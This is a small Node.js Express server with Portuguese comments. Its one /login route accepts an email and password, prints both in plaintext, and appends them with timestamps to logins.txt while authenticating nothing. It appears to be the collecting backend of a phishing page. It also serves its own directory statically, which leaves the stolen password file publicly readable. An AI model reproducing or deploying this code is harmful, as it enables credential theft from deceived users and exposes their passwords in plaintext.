const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// 🟡 Usa porta do Render ou 3000 local
const port = process.env.PORT || 3000;

// Middleware para processar JSON e formulários
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir arquivos estáticos (HTML, CSS, imagens etc.)
app.use(express.static('.'));

// Rota POST para receber o login
app.post('/login', (req, res) => {
  const { email, senha } = req.body;

  console.log('🔄 Requisição recebida: POST /login');
  console.log("\n====================== NOVO LOGIN ======================");
  console.log(`📧 Email: ${email}`);
  console.log(`🔑 Senha: ${senha}`);
  console.log("========================================================\n");

  salvarLogin(email, senha);

  // Responde com status 200 (sem mensagem)
  res.sendStatus(200);
});

// Função para salvar os dados no arquivo logins.txt
function salvarLogin(email, senha) {
  const data = `🕒 ${new Date().toLocaleString()} | 📧 Email: ${email} | 🔑 Senha: ${senha}\n`;
  fs.appendFile(path.join(__dirname, 'logins.txt'), data, (err) => {
    if (err) {
      console.error('❌ Erro ao salvar login:', err);
    } else {
      console.log('✅ Login salvo em logins.txt');
    }
  });
}

// Iniciar servidor
app.listen(port, () => {
  console.log(`🚀 Servidor rodando na porta ${port}`);
});
